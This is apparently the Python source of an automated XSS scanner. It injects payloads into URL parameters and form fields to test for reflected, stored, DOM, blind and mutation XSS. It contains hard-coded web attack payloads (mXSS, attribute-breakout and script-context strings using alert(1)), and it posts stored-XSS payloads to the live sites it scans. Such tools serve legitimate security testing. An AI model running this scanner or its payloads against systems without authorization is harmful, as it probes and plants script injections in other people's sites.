"""
Ultimate XSS Detection Engine - The Most Advanced XSS Scanner
Combines all XSS detection techniques:
- Reflected XSS
- Stored XSS
- DOM-based XSS
- Blind XSS
- Mutation XSS (mXSS)
- Context-aware testing
- Browser automation
"""
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style
from tqdm import tqdm
import time
import re

from utils.http_client import HTTPClient
from utils.parser import HTMLParser
from core.payload_generator import PayloadGenerator
from core.source_analyzer import SourceAnalyzer
from core.dom_xss_detector import DOMXSSDetector
from core.blind_xss_detector import BlindXSSDetector
from core.verifier import XSSVerifier

class UltimateXSSDetector:
    """The most advanced XSS detection engine"""
    
    def __init__(self, config):
        self.config = config
        self.http_client = HTTPClient(config)
        self.payload_generator = PayloadGenerator(config)
        self.source_analyzer = SourceAnalyzer(config)
        self.dom_detector = DOMXSSDetector(config)
        self.blind_detector = BlindXSSDetector(config)
        self.verifier = XSSVerifier(config) if config.verify_live else None
        self.results = []
        
    def scan_urls(self, urls):
        """Scan multiple URLs with all XSS detection techniques"""
        results = []
        
        if not self.config.quiet:
            pbar = tqdm(total=len(urls), desc=f"{Fore.CYAN}Ultimate XSS Scan{Style.RESET_ALL}", 
                       bar_format='{l_bar}{bar}| {n_fmt}/{total_fmt}')
        
        with ThreadPoolExecutor(max_workers=self.config.threads) as executor:
            future_to_url = {executor.submit(self.scan_url, url): url for url in urls}
            
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    results.append(result)
                    
                    if result['vulnerabilities']:
                        self._print_live_result(result)
                    
                    if not self.config.quiet:
                        pbar.update(1)
                        
                except Exception as e:
                    if self.config.verbose:
                        print(f"\n{Fore.RED}[-] Error scanning {url}: {str(e)}{Style.RESET_ALL}")
                    if not self.config.quiet:
                        pbar.update(1)
        
        if not self.config.quiet:
            pbar.close()
        
        # Close browsers
        if self.dom_detector:
            self.dom_detector.close()
        if self.verifier:
            self.verifier.close()
        
        return results
    
    def scan_url(self, url):
        """Comprehensive XSS scan with all techniques"""
        result = {
            'url': url,
            'vulnerabilities': [],
            'tested_parameters': 0,
            'tested_payloads': 0,
            'forms_found': 0,
            'techniques_used': []
        }
        
        # Fetch original page
        response = self.http_client.get(url)
        if not response:
            return result
        
        # Analyze source code
        analysis = self.source_analyzer.analyze(response.text, url)
        security_headers = self.source_analyzer.check_security_headers(response.headers)
        
        # Extract forms
        forms = HTMLParser.extract_forms(HTMLParser.parse(response.text), url)
        result['forms_found'] = len(forms)
        
        if self.config.verbose:
            print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] Scanning: {url}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
        
        # 1. Test for Reflected XSS (GET parameters)
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        
        if url_params:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[1] Testing Reflected XSS (GET){Style.RESET_ALL}")
            
            reflected_vulns = self._test_reflected_xss(url, url_params, response.text, security_headers)
            result['vulnerabilities'].extend(reflected_vulns)
            result['tested_parameters'] += len(url_params)
            result['techniques_used'].append('reflected_xss')
        
        # 2. Test for Stored XSS (POST forms)
        if forms:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[2] Testing Stored XSS (POST forms){Style.RESET_ALL}")
            
            for form in forms:
                stored_vulns = self._test_stored_xss(url, form, response.text, security_headers)
                result['vulnerabilities'].extend(stored_vulns)
                result['tested_parameters'] += len(form.get('inputs', []))
            
            result['techniques_used'].append('stored_xss')
        
        # 3. Test for DOM-based XSS
        if url_params or '#' in url:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[3] Testing DOM-based XSS{Style.RESET_ALL}")
            
            dom_vulns = self.dom_detector.detect_dom_xss(url)
            result['vulnerabilities'].extend(dom_vulns)
            result['techniques_used'].append('dom_xss')
        
        # 4. Test for Blind XSS
        if forms or url_params:
            if self.config.verbose:
                print(f"{Fore.YELLOW}[4] Testing Blind XSS{Style.RESET_ALL}")
            
            # Test URL parameters for blind XSS
            for param_name in url_params.keys():
                blind_info = self.blind_detector.test_blind_xss(url, param_name)
                if self.config.verbose:
                    print(f"{Fore.CYAN}    [*] Blind XSS payload sent for '{param_name}' (ID: {blind_info['identifier']}){Style.RESET_ALL}")
            
            result['techniques_used'].append('blind_xss')
        
        # 5. Test for Mutation XSS (mXSS)
        if self.config.verbose:
            print(f"{Fore.YELLOW}[5] Testing Mutation XSS (mXSS){Style.RESET_ALL}")
        
        mxss_vulns = self._test_mutation_xss(url, url_params, security_headers)
        result['vulnerabilities'].extend(mxss_vulns)
        result['techniques_used'].append('mutation_xss')
        
        return result
    
    def _test_reflected_xss(self, url, params, original_html, security_headers):
        """Test for reflected XSS vulnerabilities"""
        vulnerabilities = []
        
        for param_name in params.keys():
            # Generate unique marker
            marker = self.payload_generator.generate_marker()
            
            # Test with marker
            test_url = self._inject_parameter(url, param_name, marker)
            test_response = self.http_client.get(test_url)
            
            if not test_response or marker not in test_response.text:
                continue
            
            if self.config.verbose:
                print(f"{Fore.GREEN}    [+] Parameter '{param_name}' is reflected!{Style.RESET_ALL}")
            
            # Detect context
            context = self.source_analyzer.detect_context(test_response.text, marker)
            
            # Get context-aware payloads
            payloads = self.payload_generator.get_payloads(context)
            
            # Add advanced payloads
            payloads.extend(self._get_advanced_payloads(context))
            
            # Test payloads
            for payload in payloads[:15]:  # Test top 15 payloads
                payload_url = self._inject_parameter(url, param_name, payload)
                payload_response = self.http_client.get(payload_url)
                
                if not payload_response:
                    continue
                
                if payload in payload_response.text:
                    filters = self.source_analyzer.detect_filters(payload, payload_response.text)
                    
                    # Verify execution with browser if enabled
                    verified = False
                    verification_method = 'reflection_only'
                    alert_text = None
                    
                    if self.verifier and self.config.verify_live:
                        if self.config.verbose:
                            print(f"{Fore.CYAN}    [*] Verifying execution with browser...{Style.RESET_ALL}")
                        
                        verification = self.verifier.verify(payload_url)
                        verified = verification.get('verified', False)
                        verification_method = verification.get('method', 'browser')
                        alert_text = verification.get('alert_text')
                        
                        if verified:
                            if self.config.verbose:
                                print(f"{Fore.GREEN}    [✓] EXECUTION CONFIRMED! Alert: {alert_text}{Style.RESET_ALL}")
                        else:
                            if self.config.verbose:
                                print(f"{Fore.YELLOW}    [!] Reflected but not executed (filtered or encoded){Style.RESET_ALL}")
                    
                    vulnerability = {
                        'type': 'reflected_xss',
                        'method': 'GET',
                        'parameter': param_name,
                        'payload': payload,
                        'context': context,
                        'poc_url': payload_url,
                        'verified': verified,
                        'verification_method': verification_method,
                        'alert_text': alert_text,
                        'filters': filters,
                        'security_headers': security_headers,
                        'severity': self._calculate_severity(context, filters, security_headers, verified)
                    }
                    
                    vulnerabilities.append(vulnerability)
                    
                    # If verified, we found a working payload, stop testing
                    if verified:
                        break
        
        return vulnerabilities
    
    def _test_stored_xss(self, page_url, form, original_html, security_headers):
        """Test for stored XSS vulnerabilities"""
        vulnerabilities = []
        
        form_action = form['action']
        form_method = form['method']
        form_inputs = form.get('inputs', [])
        
        if not form_inputs:
            return vulnerabilities
        
        # Build form data
        form_data = {}
        testable_params = []
        csrf_token_name = None
        
        for inp in form_inputs:
            param_name = inp.get('name')
            param_value = inp.get('value', '')
            param_type = inp.get('type', 'text')
            
            if not param_name:
                continue
            
            # Handle CSRF tokens
            if param_name.lower() in ['csrf', 'token', '_csrf', 'csrf_token', 'authenticity_token']:
                csrf_token_name = param_name
                form_data[param_name] = param_value
                continue
            
            # Handle hidden fields
            if param_type == 'hidden' and param_value:
                form_data[param_name] = param_value
                continue
            
            form_data[param_name] = 'test'
            testable_params.append(param_name)
        
        if not testable_params:
            return vulnerabilities
        
        # Test each parameter
        for param_name in testable_params:
            marker = self.payload_generator.generate_marker()
            test_data = form_data.copy()
            test_data[param_name] = marker
            
            # Submit form
            if form_method == 'POST':
                test_response = self.http_client.post(form_action, data=test_data)
            else:
                test_url = f"{form_action}?{urlencode(test_data)}"
                test_response = self.http_client.get(test_url)
            
            if not test_response:
                continue
            
            # Check for stored XSS
            stored_check = self.http_client.get(page_url)
            if stored_check and marker in stored_check.text:
                if self.config.verbose:
                    print(f"{Fore.GREEN}    [+] STORED XSS detected in '{param_name}'!{Style.RESET_ALL}")
                
                context = self.source_analyzer.detect_context(stored_check.text, marker)
                payloads = self.payload_generator.get_payloads(context)
                
                for payload in payloads[:5]:
                    payload_data = form_data.copy()
                    payload_data[param_name] = payload
                    
                    if form_method == 'POST':
                        self.http_client.post(form_action, data=payload_data)
                    else:
                        payload_url = f"{form_action}?{urlencode(payload_data)}"
                        self.http_client.get(payload_url)
                    
                    verify_response = self.http_client.get(page_url)
                    if verify_response and payload in verify_response.text:
                        vulnerability = {
                            'type': 'stored_xss',
                            'method': form_method,
                            'parameter': param_name,
                            'payload': payload,
                            'context': context,
                            'form_action': form_action,
                            'display_url': page_url,
                            'verified': True,
                            'severity': 'critical'
                        }
                        
                        vulnerabilities.append(vulnerability)
                        break
        
        return vulnerabilities
    
    def _test_mutation_xss(self, url, params, security_headers):
        """Test for mutation XSS (mXSS) vulnerabilities"""
        vulnerabilities = []
        
        # mXSS payloads that exploit browser parsing differences
        mxss_payloads = [
            # Backtick-based mXSS
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            
            # SVG mXSS
            '<svg><style><img/src=x onerror=alert(1)//</style>',
            
            # MathML mXSS
            '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">',
            
            # Form mXSS
            '<form><button formaction=javascript:alert(1)>X',
            
            # Namespace confusion
            '<svg><![CDATA[><image xlink:href="]]><img/src=xx:x onerror=alert(1)//"></svg>',
            
            # Entity-based mXSS
            '&lt;img src=x onerror=alert(1)&gt;',
            
            # CSS-based mXSS
            '<style>*{background:url("javascript:alert(1)")}</style>',
        ]
        
        for param_name in params.keys():
            for payload in mxss_payloads:
                test_url = self._inject_parameter(url, param_name, payload)
                test_response = self.http_client.get(test_url)
                
                if test_response and payload in test_response.text:
                    vulnerability = {
                        'type': 'mutation_xss',
                        'parameter': param_name,
                        'payload': payload,
                        'poc_url': test_url,
                        'verified': False,
                        'severity': 'high',
                        'description': 'Potential mXSS - requires manual verification'
                    }
                    
                    vulnerabilities.append(vulnerability)
                    break
        
        return vulnerabilities
    
    def _get_advanced_payloads(self, context):
        """Get advanced context-specific payloads"""
        advanced = []
        
        if context == 'html':
            advanced.extend([
                '<svg/onload=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                '<isindex type=submit formaction=javascript:alert(1)>',
                '<form><button formaction=javascript:alert(1)>X',
                '<iframe srcdoc="<script>alert(1)</script>">',
            ])
        
        elif context == 'attribute':
            advanced.extend([
                '" autofocus onfocus=alert(1) x="',
                '\' autofocus onfocus=alert(1) x=\'',
                '" oncut=alert(1) contenteditable x="',
                '\' onpaste=alert(1) contenteditable x=\'',
            ])
        
        elif context == 'javascript':
            advanced.extend([
                '\'-alert(1)-\'',
                '\";alert(1);//',
                '\\x27-alert(1)-\\x27',
                '\\u0027-alert(1)-\\u0027',
            ])
        
        # Add polyglot payloads
        advanced.extend(self.blind_detector.generate_polyglot_payloads())
        
        return advanced
    
    def _inject_parameter(self, url, param_name, value):
        """Inject value into a specific parameter"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [value]
        
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
    
    def _calculate_severity(self, context, filters, security_headers, verified=False):
        """Calculate vulnerability severity"""
        # Verified execution is always high/critical
        if verified:
            if context in ['javascript', 'html']:
                severity = 'critical'
            else:
                severity = 'high'
        else:
            # Reflection only (not verified)
            if context in ['javascript', 'html']:
                severity = 'medium'  # Reflected but not confirmed to execute
            else:
                severity = 'low'
        
        if filters and not verified:
            severity = 'low' if severity == 'medium' else 'info'
        
        if security_headers.get('csp', {}).get('present') and not verified:
            severity = 'low' if severity == 'medium' else 'info'
        
        return severity
    
    def _print_live_result(self, result):
        """Print vulnerability result in real-time"""
        for vuln in result['vulnerabilities']:
            print(f"\n{Fore.RED}{'='*70}{Style.RESET_ALL}")
            print(f"{Fore.RED}🚨 XSS VULNERABILITY FOUND! 🚨{Style.RESET_ALL}")
            print(f"{Fore.RED}{'='*70}{Style.RESET_ALL}\n")
            
            print(f"{Fore.CYAN}URL:        {Fore.WHITE}{result['url']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Type:       {Fore.WHITE}{vuln['type'].upper().replace('_', ' ')}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}Method:     {Fore.WHITE}{vuln.get('method', 'N/A')}{Style.RESET_ALL}")
            
            # Parameter may not exist for some vulnerability types (e.g., DOM XSS patterns)
            if 'parameter' in vuln:
                print(f"{Fore.CYAN}Parameter:  {Fore.WHITE}{vuln['parameter']}{Style.RESET_ALL}")
            
            # Payload may not exist for pattern-based detections
            if 'payload' in vuln:
                print(f"{Fore.CYAN}Payload:    {Fore.WHITE}{vuln.get('payload', '')[:100]}{Style.RESET_ALL}")
            
            # Source and sink for DOM XSS patterns
            if 'source' in vuln:
                print(f"{Fore.CYAN}Source:     {Fore.WHITE}{vuln['source']}{Style.RESET_ALL}")
            if 'sink' in vuln:
                print(f"{Fore.CYAN}Sink:       {Fore.WHITE}{vuln['sink']}{Style.RESET_ALL}")
            
            print(f"{Fore.CYAN}Context:    {Fore.WHITE}{vuln.get('context', 'N/A')}{Style.RESET_ALL}")
            
            # Show verification status
            verified = vuln.get('verified', False)
            if verified:
                verification_method = vuln.get('verification_method', 'unknown')
                alert_text = vuln.get('alert_text', 'N/A')
                print(f"{Fore.CYAN}Verified:   {Fore.GREEN}✓ EXECUTION CONFIRMED{Style.RESET_ALL}")
                print(f"{Fore.CYAN}Method:     {Fore.WHITE}{verification_method}{Style.RESET_ALL}")
                if alert_text:
                    print(f"{Fore.CYAN}Alert:      {Fore.WHITE}{alert_text}{Style.RESET_ALL}")
            else:
                print(f"{Fore.CYAN}Verified:   {Fore.YELLOW}✗ Reflection only (not confirmed to execute){Style.RESET_ALL}")
            
            print(f"{Fore.CYAN}Severity:   {Fore.RED}{vuln.get('severity', 'UNKNOWN').upper()}{Style.RESET_ALL}")
            
            # Description for pattern-based findings
            if 'description' in vuln:
                print(f"{Fore.CYAN}Details:    {Fore.WHITE}{vuln['description']}{Style.RESET_ALL}")
            
            if vuln.get('poc_url'):
                print(f"\n{Fore.YELLOW}PoC URL:{Style.RESET_ALL}")
                print(f"{Fore.WHITE}{vuln['poc_url']}{Style.RESET_ALL}")
            
            print(f"\n{Fore.RED}{'='*70}{Style.RESET_ALL}\n")
